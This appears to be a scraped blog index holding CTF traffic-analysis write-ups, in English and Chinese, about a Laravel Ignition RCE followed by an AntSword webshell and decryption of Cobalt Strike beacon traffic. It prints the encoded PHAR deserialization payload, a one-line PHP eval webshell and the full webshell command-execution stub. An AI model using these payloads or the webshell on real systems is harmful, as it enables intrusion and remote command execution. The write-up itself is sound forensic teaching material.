1P&#x3D;00D&#x3D;009&#x3D;00w&#x3D;00a&#x3D;00H&#x3D;00A&#x3D;00g&#x3D;00X&#x3D;001&#x3D;009&#x3D;00I&#x3D;00Q&#x3D;00U&#x3D;00x&#x3D;00U&#x3D;00X&#x3D;000&#x3D;00N&#x3D;00P&#x3D;00T&#x3D;00V&#x3D;00B&#x3D;00J&#x3D;00T&#x3D;00E&#x3D;00V&#x3D;00S&#x3D;00K&#x3D;00C&#x3D;00k&#x3D;007&#x3D;00I&#x3D;00D&#x3D;008&#x3D;00+&#x3D;00D&#x3D;00Q&#x3D;00o&#x3D;00J&#x3D;00A&#x3D;00g&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00g&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00C&#x3D;00y&#x3D;00A&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00Y&#x3D;00T&#x3D;00o&#x3D;00y&#x3D;00O&#x3D;00n&#x3D;00t&#x3D;00p&#x3D;00O&#x3D;00j&#x3D;00c&#x3D;007&#x3D;00T&#x3D;00z&#x3D;00o&#x3D;00z&#x3D;00M&#x3D;00j&#x3D;00o&#x3D;00i&#x3D;00T&#x3D;00W&#x3D;009&#x3D;00u&#x3D;00b&#x3D;002&#x3D;00x&#x3D;00v&#x3D;00Z&#x3D;001&#x3D;00x&#x3D;00I&#x3D;00Y&#x3D;00W&#x3D;005&#x3D;00k&#x3D;00b&#x3D;00G&#x3D;00V&#x3D;00y&#x3D;00X&#x3D;00F&#x3D;00N&#x3D;005&#x3D;00c&#x3D;002&#x3D;00x&#x3D;00v&#x3D;00Z&#x3D;001&#x3D;00V&#x3D;00k&#x3D;00c&#x3D;00E&#x3D;00h&#x3D;00h&#x3D;00b&#x3D;00m&#x3D;00R&#x3D;00s&#x3D;00Z&#x3D;00X&#x3D;00I&#x3D;00i&#x3D;00O&#x3D;00j&#x3D;00E&#x3D;006&#x3D;00e&#x3D;003&#x3D;00M&#x3D;006&#x3D;00O&#x3D;00T&#x3D;00o&#x3D;00i&#x3D;00A&#x3D;00C&#x3D;00o&#x3D;00A&#x3D;00c&#x3D;002&#x3D;009&#x3D;00j&#x3D;00a&#x3D;002&#x3D;00V&#x3D;000&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00P&#x3D;00O&#x3D;00j&#x3D;00I&#x3D;005&#x3D;00O&#x3D;00i&#x3D;00J&#x3D;00N&#x3D;00b&#x3D;002&#x3D;005&#x3D;00v&#x3D;00b&#x3D;00G&#x3D;009&#x3D;00n&#x3D;00X&#x3D;00E&#x3D;00h&#x3D;00h&#x3D;00b&#x3D;00m&#x3D;00R&#x3D;00s&#x3D;00Z&#x3D;00X&#x3D;00J&#x3D;00c&#x3D;00Q&#x3D;00n&#x3D;00V&#x3D;00m&#x3D;00Z&#x3D;00m&#x3D;00V&#x3D;00y&#x3D;00S&#x3D;00G&#x3D;00F&#x3D;00u&#x3D;00Z&#x3D;00G&#x3D;00x&#x3D;00l&#x3D;00c&#x3D;00i&#x3D;00I&#x3D;006&#x3D;00N&#x3D;00z&#x3D;00p&#x3D;007&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;00x&#x3D;00M&#x3D;00D&#x3D;00o&#x3D;00i&#x3D;00A&#x3D;00C&#x3D;00o&#x3D;00A&#x3D;00a&#x3D;00G&#x3D;00F&#x3D;00u&#x3D;00Z&#x3D;00G&#x3D;00x&#x3D;00l&#x3D;00c&#x3D;00i&#x3D;00I&#x3D;007&#x3D;00c&#x3D;00j&#x3D;00o&#x3D;00z&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00M&#x3D;006&#x3D;00I&#x3D;00g&#x3D;00A&#x3D;00q&#x3D;00A&#x3D;00G&#x3D;00J&#x3D;001&#x3D;00Z&#x3D;00m&#x3D;00Z&#x3D;00l&#x3D;00c&#x3D;00l&#x3D;00N&#x3D;00p&#x3D;00e&#x3D;00m&#x3D;00U&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00k&#x3D;006&#x3D;00L&#x3D;00T&#x3D;00E&#x3D;007&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;005&#x3D;00O&#x3D;00i&#x3D;00I&#x3D;00A&#x3D;00K&#x3D;00g&#x3D;00B&#x3D;00i&#x3D;00d&#x3D;00W&#x3D;00Z&#x3D;00m&#x3D;00Z&#x3D;00X&#x3D;00I&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00E&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00p&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00w&#x3D;00O&#x3D;002&#x3D;00E&#x3D;006&#x3D;00M&#x3D;00j&#x3D;00p&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00w&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00N&#x3D;00z&#x3D;00c&#x3D;006&#x3D;00I&#x3D;00m&#x3D;00V&#x3D;00j&#x3D;00a&#x3D;00G&#x3D;008&#x3D;00g&#x3D;00X&#x3D;00j&#x3D;00w&#x3D;00&#x2F;&#x3D;00c&#x3D;00G&#x3D;00h&#x3D;00w&#x3D;00I&#x3D;00E&#x3D;00B&#x3D;00l&#x3D;00d&#x3D;00m&#x3D;00F&#x3D;00s&#x3D;00K&#x3D;00E&#x3D;00B&#x3D;00n&#x3D;00e&#x3D;00m&#x3D;00l&#x3D;00u&#x3D;00Z&#x3D;00m&#x3D;00x&#x3D;00h&#x3D;00d&#x3D;00G&#x3D;00U&#x3D;00o&#x3D;00Y&#x3D;00m&#x3D;00F&#x3D;00z&#x3D;00Z&#x3D;00T&#x3D;00Y&#x3D;000&#x3D;00X&#x3D;002&#x3D;00R&#x3D;00l&#x3D;00Y&#x3D;002&#x3D;009&#x3D;00k&#x3D;00Z&#x3D;00S&#x3D;00g&#x3D;00k&#x3D;00X&#x3D;001&#x3D;00B&#x3D;00P&#x3D;00U&#x3D;001&#x3D;00R&#x3D;00b&#x3D;00M&#x3D;00T&#x3D;00Q&#x3D;000&#x3D;00M&#x3D;00z&#x3D;00N&#x3D;00d&#x3D;00K&#x3D;00S&#x3D;00k&#x3D;00p&#x3D;00O&#x3D;00z&#x3D;009&#x3D;00e&#x3D;00P&#x3D;00i&#x3D;00A&#x3D;00+&#x3D;00I&#x3D;00C&#x3D;005&#x3D;00j&#x3D;00b&#x3D;002&#x3D;005&#x3D;00m&#x3D;00a&#x3D;00W&#x3D;00c&#x3D;00u&#x3D;00c&#x3D;00G&#x3D;00h&#x3D;00w&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00z&#x3D;00O&#x3D;00j&#x3D;00U&#x3D;006&#x3D;00I&#x3D;00m&#x3D;00x&#x3D;00l&#x3D;00d&#x3D;00m&#x3D;00V&#x3D;00s&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00O&#x3D;00O&#x3D;003&#x3D;001&#x3D;009&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;004&#x3D;00O&#x3D;00i&#x3D;00I&#x3D;00A&#x3D;00K&#x3D;00g&#x3D;00B&#x3D;00s&#x3D;00Z&#x3D;00X&#x3D;00Z&#x3D;00l&#x3D;00b&#x3D;00C&#x3D;00I&#x3D;007&#x3D;00T&#x3D;00j&#x3D;00t&#x3D;00z&#x3D;00O&#x3D;00j&#x3D;00E&#x3D;000&#x3D;00O&#x3D;00i&#x3D;00I&#x3D;00A&#x3D;00K&#x3D;00g&#x3D;00B&#x3D;00p&#x3D;00b&#x3D;00m&#x3D;00l&#x3D;000&#x3D;00a&#x3D;00W&#x3D;00F&#x3D;00s&#x3D;00a&#x3D;00X&#x3D;00p&#x3D;00l&#x3D;00Z&#x3D;00C&#x3D;00I&#x3D;007&#x3D;00Y&#x3D;00j&#x3D;00o&#x3D;00x&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00Q&#x3D;006&#x3D;00I&#x3D;00g&#x3D;00A&#x3D;00q&#x3D;00A&#x3D;00G&#x3D;00J&#x3D;001&#x3D;00Z&#x3D;00m&#x3D;00Z&#x3D;00l&#x3D;00c&#x3D;00k&#x3D;00x&#x3D;00p&#x3D;00b&#x3D;00W&#x3D;00l&#x3D;000&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00p&#x3D;00O&#x3D;00i&#x3D;000&#x3D;00x&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00M&#x3D;006&#x3D;00I&#x3D;00g&#x3D;00A&#x3D;00q&#x3D;00A&#x3D;00H&#x3D;00B&#x3D;00y&#x3D;00b&#x3D;002&#x3D;00N&#x3D;00l&#x3D;00c&#x3D;003&#x3D;00N&#x3D;00v&#x3D;00c&#x3D;00n&#x3D;00M&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00E&#x3D;006&#x3D;00M&#x3D;00j&#x3D;00p&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00w&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00N&#x3D;00z&#x3D;00o&#x3D;00i&#x3D;00Y&#x3D;003&#x3D;00V&#x3D;00y&#x3D;00c&#x3D;00m&#x3D;00V&#x3D;00u&#x3D;00d&#x3D;00C&#x3D;00I&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00x&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00N&#x3D;00j&#x3D;00o&#x3D;00i&#x3D;00c&#x3D;003&#x3D;00l&#x3D;00z&#x3D;00d&#x3D;00G&#x3D;00V&#x3D;00t&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;009&#x3D;00f&#x3D;00X&#x3D;001&#x3D;00p&#x3D;00O&#x3D;00j&#x3D;00c&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;003&#x3D;00O&#x3D;003&#x3D;000&#x3D;00F&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00Z&#x3D;00H&#x3D;00V&#x3D;00t&#x3D;00b&#x3D;00X&#x3D;00k&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00X&#x3D;00E&#x3D;00t&#x3D;00L&#x3D;00Y&#x3D;00Q&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00M&#x3D;00f&#x3D;00n&#x3D;00&#x2F;&#x3D;00Y&#x3D;00t&#x3D;00g&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00I&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00d&#x3D;00G&#x3D;00V&#x3D;00z&#x3D;00d&#x3D;00C&#x3D;005&#x3D;000&#x3D;00e&#x3D;00H&#x3D;00Q&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00X&#x3D;00E&#x3D;00t&#x3D;00L&#x3D;00Y&#x3D;00Q&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00M&#x3D;00f&#x3D;00n&#x3D;00&#x2F;&#x3D;00Y&#x3D;00t&#x3D;00g&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;000&#x3D;00Z&#x3D;00X&#x3D;00N&#x3D;000&#x3D;00d&#x3D;00G&#x3D;00V&#x3D;00z&#x3D;00d&#x3D;00D&#x3D;00Z&#x3D;006&#x3D;00P&#x3D;00U&#x3D;00p&#x3D;00j&#x3D;00h&#x3D;00k&#x3D;00a&#x3D;00y&#x3D;00y&#x3D;00N&#x3D;00i&#x3D;00Q&#x3D;003&#x3D;00Y&#x3D;00w&#x3D;00m&#x3D;00f&#x3D;00p&#x3D;00c&#x3D;008&#x3D;00Q&#x3D;00J&#x3D;00n&#x3D;00s&#x3D;00A&#x3D;00g&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00E&#x3D;00d&#x3D;00C&#x3D;00T&#x3D;00U&#x3D;00I&#x3D;00&#x3D;00 Replacing =00 to null then base64 decode it, we can get the webshell contents. 12&lt;?php __HALT_COMPILER(); ?&gt; \u0002\u0002\u0011\u0001�\u0001a:2:&#123;i:7;O:32:&quot;Monolog\\Handler\\SyslogUdpHandler&quot;:1:&#123;s:9:&quot;*socket&quot;;O:29:&quot;Monolog\\Handler\\BufferHandler&quot;:7:&#123;s:10:&quot;*handler&quot;;r:3;s:13:&quot;*bufferSize&quot;;i:-1;s:9:&quot;*buffer&quot;;a:1:&#123;i:0;a:2:&#123;i:0;s:77:&quot;echo ^&lt;?php @eval(@gzinflate(base64_decode($_POST[14433])));?^&gt; &gt; .config.php&quot;;s:5:&quot;level&quot;;N;&#125;&#125;s:8:&quot;*level&quot;;N;s:14:&quot;*initialized&quot;;b:1;s:14:&quot;*bufferLimit&quot;;i:-1;s:13:&quot;*processors&quot;;a:2:&#123;i:0;s:7:&quot;current&quot;;i:1;s:6:&quot;system&quot;;&#125;&#125;&#125;i:7;i:7;&#125;\u0005dummy\u0004\\KKa\u0004 ~ض\u0001\btest.txt\u0004\\KKa\u0004 ~ض\u0001testtest6z&#x3D;Jc�F��ؐ݌&amp;~�&lt;@��\u0002GBMB are webshell.We can decode traffic after base64 and gzip decode. 1234514433&#x3D;c0gtS8zRcEivysxLy0ksSdVISixONTOJT0lNzk9J1VCJD&#x2F;APDomON6gwSDFJNUpJNUs2TEs0j9XU1LQGAA&#x3D;&#x3D;_0x0d4e2de6c1fa7&#x3D;jVZtT9tIEP5+v2JZWcRWTZy3o5Q9U6MqVSvRAxF0fCiV5dhrsodjW7sOgUv8329m&#x2F;ZYA1ysI5JmdeXbeZz2RCl&#x2F;xwqSRUHkSPPtcykwqahM6oBbz4MwvxJL7iViKwhxYzMjySEjXQ8171MxynvrzQHFgg4qIzUrEIhsjC9eRC99psOSm4c+m139Nr7&#x2F;T2afrr1c3&#x2F;uevF9M&#x2F;z79N6Q8NG0jp5pLf+2AJ3EUdtj11qF2jMQ&#x2F;OwcB8pRZmJW1rfFs9K7TEL&#x2F;gy90HUtCwWZ5IHYSNIAkUMAedgE9h34Anlr6UognkCZukDaxNmaSHSFWclM4ol+qhP+tTpxzyKhpR5yweEr061pwdeLBLu8yehCtUc7EJ54WJXxWvjvRc1iHa&#x2F;D7EzwrTAKHh7YbiDn+2dg6GoYcA7MNsdMEP8ocQ&#x2F;PIOYV6qAId69szb1vRVs+Z&#x2F;3UgeTLJe7Ns4hcg+gUzIWr9KwEFkK8eNpCMFcFdZG8mIlU4IEyOyIACNfFaa1MaovN5vrvGA0eArxsRhweBr5YcKDFEgeLjJCx8e0TyfxiFa0110GII3QZARCcQxZKAFEga9wEyvk88bIXfTneOJHPMwibqrVXBXgj391Obv5TuOT42E0&#x2F;jAZvh+MJhP6wx5BfRjq50qreB6Nx7+fjE7i8SBulHj6CEKu91PV+WQ8mI+Hg5PxSfBh3Kj+ahuEbgMX2QN7aLku5OgjPQrJHd0Yqryj9JQ6OxSW4RsqUAIQPTDYpFfnN19c2odUtCS1+vTUWSnpJFkYJI6ai3SXbsnuQH9UJPzDquKJ4v97C&#x2F;t06tyKNMrWyoFGhYYaj3Z5s2d1e3l7PNnhvTjWKg3jKltzOVvwJHEeh&#x2F;2Bw9AQbETo&#x2F;eLZrDMELYhf2Er8KU8wSXS73QYqESmHD2i4RrKbFJWCHhWPek6QFvXRAkbjKWj5ksOwDBvUB&#x2F;5cgVIXkUGalWVpSBdylJcwBsOSdo0SQwnEYGDU2WZTu5unMIlxLvmNgqKWnjW1LZGldfUwNJssNAx&#x2F;GeRmr5Bi2bN3GGBykSUYup6NAKysmths7mgnWGwdHsJwhBpIquGIjAOR+tV9Rlzrd+7IVaowH2qRhQ9YgsQI6&#x2F;B1ZUkGNhlaxHUJlCY5PMQg9Kp49iykTWTo3eMn2T3wtlstswxE0rOsBrCQCAgJiyCTDzAboRQdtaAWxB6aEj7IgUs+n1&#x2F;Mprh+imVOXIJ7ATrPfL0nbNILVM9ibQ1&#x2F;ufIvLi9cE5TJEyMlA2fImcYZnR0O9Xp7ZSsIt5RJA4quspJgYsgGHQCmNxy97w&#x2F;gd4hl0vwdzR+xfhvZerJ+DoBiZT0AwYFqyeyNUjQJJvcq1XGoKDStUYIoUAjGJpciLbpZWt9wI3E3lfv37aU0XEawUqDSQAb3zC+OLyhTDE7V6BCZjVd9ApaNUHW91mJ5oFSxkCst2BBvi+oSgyrlIQpXXnkdE23dV2hEvfoY3go1bKX8dyZSk&#x2F;6Gz4sXmjmuSFQ14hw2MVKo35NQKOsFZAK3vl65cd7ZEkN6sH9yezSYnCCkl4dJprgW279AZqHfXoIV6rUsvIlUvTYk7ln92ctFzntQrese1Ozo7QM4MUT20kaRfR&#x2F;+eGWm5raWvtIYvakx6jS8uPatgme79Ahp7VDNe+F+APXb1UdLYQpbuTeHitV2CCayld1ffgduPWG8MIGKagYb&#x2F;XT5jWK4127K1wQos3c7C6XIi76+qYfr3TXWR2dNPcEbIXMNfnQ2K6JLfNcwvLbvAvvo7BpG0HmSIFPxRmoq5Y4U35Wq+7Cra91ZkHqYC800rt3SAK7XNKHs02b2aBCiUQ7cgfWRoqAGKuFRQBkrw6CAVTZ9CnmuO9ng1qZ6P02vry+vT+ER2UdjIaffuFLBPccVwrq3G4sEsv4Fb430b310838a93&#x3D;4gf861d394170244&#x3D;X4Y21kufbd335828f30f&#x3D;0bY2QgL2QgIkQ6XFxwaHBzdHVkeV9wcm9cXFdXV1xcc2VjcmV0IiYiQzpcUHJvZ3JhbSBGaWxlc1w3LVppcFw3ei5leGUiIHggc2VjcmV0LnppcCAtcFA0VWs2cWtoNkd2cXdnM3kmZWNobyAzNzhkZjJjMjM0JmNkJmVjaG8gZmI3Zjhm Above encryped data are webshell commands which executing extract zip file,decode it with base64 and gzip, we can get the source code of server send to client. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);$opdir&#x3D;@ini_get(&quot;open_basedir&quot;);if($opdir) &#123; $ocwd&#x3D;dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]); $oparr&#x3D;preg_split(&quot;&#x2F;;|:&#x2F;&quot;,$opdir); @array_push($oparr,$ocwd,sys_get_temp_dir()); foreach($oparr as $item) &#123; if(!@is_writable($item)) &#123; continue; &#125; ; $tmdir&#x3D;$item.&quot;&#x2F;.fedd1&quot;; @mkdir($tmdir); if(!@file_exists($tmdir)) &#123; continue; &#125; @chdir($tmdir); @ini_set(&quot;open_basedir&quot;, &quot;..&quot;); $cntarr&#x3D;@preg_split(&quot;&#x2F;\\\\\\\\|\\&#x2F;&#x2F;&quot;,$tmdir); for ($i&#x3D;0;$i&lt;sizeof($cntarr);$i++) &#123; @chdir(&quot;..&quot;); &#125; ; @ini_set(&quot;open_basedir&quot;,&quot;&#x2F;&quot;); @rmdir($tmdir); break; &#125; ;&#125;;;function asenc($out) &#123; return $out;&#125;;function asoutput() &#123; $output&#x3D;ob_get_contents(); ob_end_clean(); echo &quot;36&quot;.&quot;4f2&quot;; echo @asenc($output); echo &quot;42&quot;.&quot;ff1&quot;;&#125;ob_start();try &#123; $p&#x3D;base64_decode(substr($_POST[&quot;f861d394170244&quot;],2)); $s&#x3D;base64_decode(substr($_POST[&quot;ufbd335828f30f&quot;],2)); $envstr&#x3D;@base64_decode(substr($_POST[&quot;b430b310838a93&quot;],2)); $d&#x3D;dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]); $c&#x3D;substr($d,0,1)&#x3D;&#x3D;&quot;&#x2F;&quot;?&quot;-c \\&quot;&#123;$s&#125;\\&quot;&quot;:&quot;&#x2F;c \\&quot;&#123;$s&#125;\\&quot;&quot;; if(substr($d,0,1)&#x3D;&#x3D;&quot;&#x2F;&quot;) &#123; @putenv(&quot;PATH&#x3D;&quot;.getenv(&quot;PATH&quot;).&quot;:&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin&quot;); &#125; else &#123; @putenv(&quot;PATH&#x3D;&quot;.getenv(&quot;PATH&quot;).&quot;;C:&#x2F;Windows&#x2F;system32;C:&#x2F;Windows&#x2F;SysWOW64;C:&#x2F;Windows;C:&#x2F;Windows&#x2F;System32&#x2F;WindowsPowerShell&#x2F;v1.0&#x2F;;&quot;); &#125; if(!empty($envstr)) &#123; $envarr&#x3D;explode(&quot;|||asline|||&quot;, $envstr); foreach($envarr as $v) &#123; if (!empty($v)) &#123; @putenv(str_replace(&quot;|||askey|||&quot;, &quot;&#x3D;&quot;, $v)); &#125; &#125; &#125; $r&#x3D;&quot;&#123;$p&#125; &#123;$c&#125;&quot;; function fe($f) &#123; $d&#x3D;explode(&quot;,&quot;,@ini_get(&quot;disable_functions&quot;)); if(empty($d)) &#123; $d&#x3D;array(); &#125; else &#123; $d&#x3D;array_map(&#39;trim&#39;,array_map(&#39;strtolower&#39;,$d)); &#125; return(function_exists($f)&amp;&amp;is_callable($f)&amp;&amp;!in_array($f,$d)); &#125; ; function runshellshock($d, $c) &#123; if (substr($d, 0, 1) &#x3D;&#x3D; &quot;&#x2F;&quot; &amp;&amp; fe(&#39;putenv&#39;) &amp;&amp; (fe(&#39;error_log&#39;) || fe(&#39;mail&#39;))) &#123; if (strstr(readlink(&quot;&#x2F;bin&#x2F;sh&quot;), &quot;bash&quot;) !&#x3D; FALSE) &#123; $tmp &#x3D; tempnam(sys_get_temp_dir(), &#39;as&#39;); putenv(&quot;PHP_LOL&#x3D;() &#123; x; &#125;; $c &gt;$tmp 2&gt;&amp;1&quot;); if (fe(&#39;error_log&#39;)) &#123; error_log(&quot;a&quot;, 1); &#125; else &#123; mail(&quot;a@127.0.0.1&quot;, &quot;&quot;, &quot;&quot;, &quot;-bv&quot;); &#125; &#125; else &#123; return False; &#125; $output &#x3D; @file_get_contents($tmp); @unlink($tmp); if ($output !&#x3D; &quot;&quot;) &#123; print($output); return True; &#125; &#125; return False; &#125; ; function runcmd($c) &#123; $ret&#x3D;0; $d&#x3D;dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]); if(fe(&#39;system&#39;)) &#123; @system($c,$ret); &#125; elseif(fe(&#39;passthru&#39;)) &#123; @passthru($c,$ret); &#125; elseif(fe(&#39;shell_exec&#39;)) &#123; print(@shell_exec($c)); &#125; elseif(fe(&#39;exec&#39;)) &#123; @exec($c,$o,$ret); print(join(&quot;&quot;,$o)); &#125; elseif(fe(&#39;popen&#39;)) &#123; $fp&#x3D;@popen($c,&#39;r&#39;); while(!@feof($fp)) &#123; print(@fgets($fp,2048)); &#125; @pclose($fp); &#125; elseif(fe(&#39;proc_open&#39;)) &#123; $p &#x3D; @proc_open($c, array(1 &#x3D;&gt; array(&#39;pipe&#39;, &#39;w&#39;), 2 &#x3D;&gt; array(&#39;pipe&#39;, &#39;w&#39;)), $io); while(!@feof($io[1])) &#123; print(@fgets($io[1],2048)); &#125; while(!@feof($io[2])) &#123; print(@fgets($io[2],2048)); &#125; @fclose($io[1]); @fclose($io[2]); @proc_close($p); &#125; elseif(fe(&#39;antsystem&#39;)) &#123; @antsystem($c); &#125; elseif(runshellshock($d, $c)) &#123; return $ret; &#125; elseif(substr($d,0,1)!&#x3D;&quot;&#x2F;&quot; &amp;&amp; @class_exists(&quot;COM&quot;)) &#123; $w&#x3D;new COM(&#39;WScript.shell&#39;); $e&#x3D;$w-&gt;exec($c); $so&#x3D;$e-&gt;StdOut(); $ret.&#x3D;$so-&gt;ReadAll(); $se&#x3D;$e-&gt;StdErr(); $ret.&#x3D;$se-&gt;ReadAll(); print($ret); &#125; else &#123; $ret &#x3D; 127; &#125; return $ret; &#125; ; $ret&#x3D;@runcmd($r.&quot; 2&gt;&amp;1&quot;); print ($ret!&#x3D;0)?&quot;ret&#x3D;&#123;$ret&#125;&quot;:&quot;&quot;; ;&#125;catch(Exception $e) &#123; echo &quot;ERROR:&#x2F;&#x2F;&quot;.$e-&gt;getMessage();&#125;;asoutput();die(); We can see that parameter s receive parameter ufbd335828f30f’s value. 1$s&#x3D;base64_decode(substr($_POST[&quot;ufbd335828f30f&quot;],2)); so, s= /d \"D:\\\\phpstudy_pro\\\\WWW\\\\secret\"&\"C:\\Program Files\\7-Zip\\7z.exe\" x secret.zip -pP4Uk6qkh6Gvqwg3y&echo 378df2c234&cd&echo fb7f8f1 The password was found,P4Uk6qkh6Gvqwg3y.Then extract beacon_keys file.We can recover serialized private key by https://github.com/WBGlIl/CS_Decrypt. From RSA key we can recover AES key in traffic ,usually the encryped data located in cookie field. From AES key we can recover totally communication contents,according to cobalt strike traffic characetristics,we can get beacon’s task execution results from the pacakage which POST DATA to submit.php?id=xxx. Note that data should be base64 format,then use script decode it. So beacon’s task execution result were shown in above figure, it contains the flag what we want. Referencehttps://blog.csdn.net/qq_43264813/article/details/120560209 https://wbglil.gitbook.io/cobalt-strike/cobalt-strike-yuan-li-jie-shao/cs-mu-biao-shang-xian-guo-cheng#beacon-shu-ju-hui-chuan https://www.wkr.moe/ctf/610.html#toc-head-3","categories":[],"tags":[],"author":"Polo"},{"title":"Quick start  Captfencoder in Mac","slug":"Quick-start-Captfencoder-in-Mac","date":"2021-10-08T07:35:41.000Z","updated":"2021-10-09T02:44:06.000Z","comments":true,"path":"2021/10/08/Quick-start-Captfencoder-in-Mac/","link":"","permalink":"https://polosec.github.io/2021/10/08/Quick-start-Captfencoder-in-Mac/","excerpt":"","text":"ToolsAutomator in macopen automator,choose application,search shell on the topthen type 1export PATH&#x3D;$PATH:&#x2F;path&#x2F;to&#x2F;npm&#x2F;;cd &#x2F;path&#x2F;to&#x2F;npm&#x2F;apps ;npm start Automator doesn’t know the path of npm, so it should be exported frist.","categories":[],"tags":[],"author":"Polo"},{"title":"绿城杯流量分析","slug":"绿城杯流量分析","date":"2021-10-07T02:33:09.000Z","updated":"2021-10-07T13:25:07.000Z","comments":true,"path":"2021/10/07/绿城杯流量分析/","link":"","permalink":"https://polosec.github.io/2021/10/07/%E7%BB%BF%E5%9F%8E%E6%9D%AF%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/","excerpt":"","text":"这题挺有意思的，还是按流量分析的思路来做，个人习惯先看post包在这里看到了很多ignition之类的包，百度了下这是一个laravel的RCE。后面的包一直在向.config.php post数据，怀疑config.php是写的马，跟进去看看。使用http contains config过滤出来。很明显是webshell了，这是在执行ls继续跟踪这个webshell的数据包，看看有无有价值的信息。看到了一个secret.zip，但是http对象导出并没有这玩意。继续追踪看到了pk开头的一段数据，考虑是压缩包，尝试进行还原。需要注意的是，压缩包前后有两段字符串是蚁剑自带干扰流量特征的。还原之后是个加密的压缩包，不是伪加密，下一步的目的是找到压缩包的密码。同时需要注意的是，这里文件名和cobalt strike有关（rt废物狂喜），然后搜了下.cobaltstrike.beacon_keys这个东西是干嘛的。上述文件是一个序列化后的公钥私钥文件，CS的beacon会嵌入这个文件中的公钥，当然了，私钥是留给server自己的。下一步应该是对这个文件进行解密，获取CS的通信数据。既然知道了是cobalt strike的通信流量，那么需要找到beacon与teamserver交互的数据包，但这个前提是得到私钥。获取私钥的前提是解开压缩包的密码。下面需要做的是找压缩包的密码。继续追踪数据包，在上面的包中看到了解压的操作。但是当时我直接对传输的数据进行URL+BASE64解码，并不能得到任何有价值的信息。那么接下来需要做的是看一看传的马的内容以及加密方式。在laravel RCE的包中可以找到payload 1P&#x3D;00D&#x3D;009&#x3D;00w&#x3D;00a&#x3D;00H&#x3D;00A&#x3D;00g&#x3D;00X&#x3D;001&#x3D;009&#x3D;00I&#x3D;00Q&#x3D;00U&#x3D;00x&#x3D;00U&#x3D;00X&#x3D;000&#x3D;00N&#x3D;00P&#x3D;00T&#x3D;00V&#x3D;00B&#x3D;00J&#x3D;00T&#x3D;00E&#x3D;00V&#x3D;00S&#x3D;00K&#x3D;00C&#x3D;00k&#x3D;007&#x3D;00I&#x3D;00D&#x3D;008&#x3D;00+&#x3D;00D&#x3D;00Q&#x3D;00o&#x3D;00J&#x3D;00A&#x3D;00g&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00g&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00C&#x3D;00y&#x3D;00A&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00Y&#x3D;00T&#x3D;00o&#x3D;00y&#x3D;00O&#x3D;00n&#x3D;00t&#x3D;00p&#x3D;00O&#x3D;00j&#x3D;00c&#x3D;007&#x3D;00T&#x3D;00z&#x3D;00o&#x3D;00z&#x3D;00M&#x3D;00j&#x3D;00o&#x3D;00i&#x3D;00T&#x3D;00W&#x3D;009&#x3D;00u&#x3D;00b&#x3D;002&#x3D;00x&#x3D;00v&#x3D;00Z&#x3D;001&#x3D;00x&#x3D;00I&#x3D;00Y&#x3D;00W&#x3D;005&#x3D;00k&#x3D;00b&#x3D;